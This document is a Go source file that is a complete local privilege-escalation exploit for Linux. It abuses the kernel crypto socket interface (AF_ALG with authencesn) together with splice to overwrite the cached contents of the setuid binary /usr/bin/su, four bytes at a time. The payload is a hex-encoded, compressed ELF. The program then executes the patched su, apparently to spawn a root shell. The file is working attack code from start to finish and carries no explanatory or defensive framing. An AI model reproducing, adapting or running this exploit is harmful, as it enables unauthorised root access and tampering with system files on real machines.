package main

import (
	"bytes"
	"compress/flate"
	"compress/zlib"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

const aadLen uint32 = 8
const authSize int = 4
const SOL_ALG = 279

func unixCmsg(level, typ int, data []byte) []byte {
	cmsgLen := syscall.CmsgLen(len(data))
	buf := make([]byte, cmsgLen)
	binary.LittleEndian.PutUint32(buf[0:4], uint32(cmsgLen))
	binary.LittleEndian.PutUint32(buf[4:8], uint32(level))
	binary.LittleEndian.PutUint32(buf[8:12], uint32(typ))

	if len(data) > 0 {
		offset := syscall.CmsgLen(0)
		copy(buf[offset:], data)
	}
	return buf
}

func overwriteChunk(fileFd int, offset int, fourBytes []byte, key []byte) error {
	sock, err := syscall.Socket(syscall.AF_ALG, syscall.SOCK_SEQPACKET, 0)
	if err != nil {
		return err
	}
	defer syscall.Close(sock)

	name := []byte("authencesn(hmac(sha256),cbc(aes))\x00")
	atype := []byte("aead\x00")

	sa := make([]byte, 88)
	binary.LittleEndian.PutUint16(sa[0:2], uint16(syscall.AF_ALG))
	copy(sa[2:6], atype)
	copy(sa[14:14+len(name)], name)

	_, _, e1 := syscall.Syscall(
		syscall.SYS_BIND,
		uintptr(sock),
		uintptr(unsafe.Pointer(&sa[0])),
		uintptr(len(sa)),
	)
	if e1 != 0 {
		return e1
	}

	err = syscall.SetsockoptString(sock, SOL_ALG, syscall.ALG_SET_KEY, string(key))
	if err != nil {
		return err
	}

	err = syscall.SetsockoptInt(sock, SOL_ALG, syscall.ALG_SET_AEAD_AUTHSIZE, authSize)
	if err != nil {
		return err
	}

	opSocket, _, err := syscall.Accept(sock)
	if err != nil {
		return err
	}
	defer syscall.Close(opSocket)

	header := []byte("AAAA")
	data := append(header, fourBytes...)

	op := uint32(syscall.ALG_OP_DECRYPT)
	ivLen := uint32(16)

	ivBuf := new(bytes.Buffer)
	_ = binary.Write(ivBuf, binary.LittleEndian, ivLen)
	ivBuf.Write(make([]byte, 16))
	ivBytes := ivBuf.Bytes()

	ivCmsgPayload := make([]byte, 4+len(ivBytes))
	binary.LittleEndian.PutUint32(ivCmsgPayload[0:4], uint32(len(ivBytes)))
	copy(ivCmsgPayload[4:], ivBytes)

	ivCmsgData := unixCmsg(SOL_ALG, 1, ivCmsgPayload) // 1 = ALG_SET_IV
	opCmsgData := unixCmsg(SOL_ALG, 2, []byte{byte(op), 0, 0, 0}) // 2 = ALG_SET_OP
	aadBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(aadBytes, aadLen)
	aadCmsgData := unixCmsg(SOL_ALG, 4, aadBytes) // 4 = ALG_SET_AEAD_ASSOCLEN

	var cmsgs []byte
	cmsgs = append(cmsgs, ivCmsgData...)
	cmsgs = append(cmsgs, opCmsgData...)
	cmsgs = append(cmsgs, aadCmsgData...)

	// Combine header and control message structs into raw pointers
	iov := syscall.Iovec{Base: &data[0], Len: uint64(len(data))}
	msghdr := syscall.Msghdr{
		Name:    nil,
		Namelen: 0,
		Iov:     &iov,
		Iovlen:  1,
		Control: &cmsgs[0],
		Controllen: uint64(len(cmsgs)),
		Flags:   syscall.MSG_MORE,
	}

	_, _, errNo := syscall.Syscall(
		syscall.SYS_SENDMSG,
		uintptr(opSocket),
		uintptr(unsafe.Pointer(&msghdr)),
		0,
	)
	if errNo != 0 {
		return errNo
	}

	spliceLen := offset + 4
	var pipeFds [2]int
	err = syscall.Pipe(pipeFds[:])
	if err != nil {
		return err
	}
	defer syscall.Close(pipeFds[0])
	defer syscall.Close(pipeFds[1])

	pipeReadFd := pipeFds[0]
	pipeWriteFd := pipeFds[1]

	var off int64
	_, err = syscall.Splice(fileFd, &off, pipeWriteFd, nil, spliceLen, 0)
	if err != nil {
		return err
	}

	_, err = syscall.Splice(pipeReadFd, nil, opSocket, nil, spliceLen, 0)
	if err != nil {
		return err
	}

	recvBuf := make([]byte, 8+offset)
	_, err = syscall.Read(opSocket, recvBuf)
	if err != nil {
		// Ignore read errors that don't abort loop logic
	}

	return nil
}

func main() {
	targetBinary := "/usr/bin/su"

	const aeadKeyHex string = "08000100000000100000000000000000000000000000000000000000000000000000000000000000"
	const shellcodeHex string = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"

	aeadKey, err := hex.DecodeString(aeadKeyHex)
	if err != nil {
		fmt.Printf("Error parsing aeadKeyHex: %v\n", err)
		return
	}

	scBytes, err := hex.DecodeString(shellcodeHex)
	if err != nil {
		fmt.Printf("Error decoding shellcode hex: %v\n", err)
		return
	}

	scReader, err := zlib.NewReader(bytes.NewReader(scBytes))
	var patchElf []byte

	if err != nil {
		fmt.Printf("ZLIB header invalid, falling back to raw DEFLATE: %v\n", err)
		flateReader := flate.NewReader(bytes.NewReader(scBytes))
		patchElf, err = io.ReadAll(flateReader)
		flateReader.Close()
		if err != nil {
			fmt.Printf("Failed to decompress shellcode: %v\n", err)
			return
		}
	} else {
		defer scReader.Close()
		patchElf, err = io.ReadAll(scReader)
		if err != nil {
			fmt.Printf("Failed to read zlib stream: %v\n", err)
			return
		}
	}

	fmt.Printf("Successfully decompressed %d bytes of shellcode.\n", len(patchElf))

	fd, err := syscall.Open(targetBinary, syscall.O_RDONLY, 0)
	if err != nil {
		fmt.Printf("Failed to open binary: %v\n", err)
		return
	}
	defer syscall.Close(fd)

	for i := 0; i <= len(patchElf)-authSize; i += authSize {
		err := overwriteChunk(fd, i, patchElf[i:i+authSize], aeadKey)
		if err != nil {
			fmt.Printf("Failed at chunk %d: %v\n", i, err)
			return
		}
	}

	cmd := exec.Command(targetBinary)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err = cmd.Run()
	if err != nil {
		fmt.Printf("Failed to execute binary: %v\n", err)
	}
}
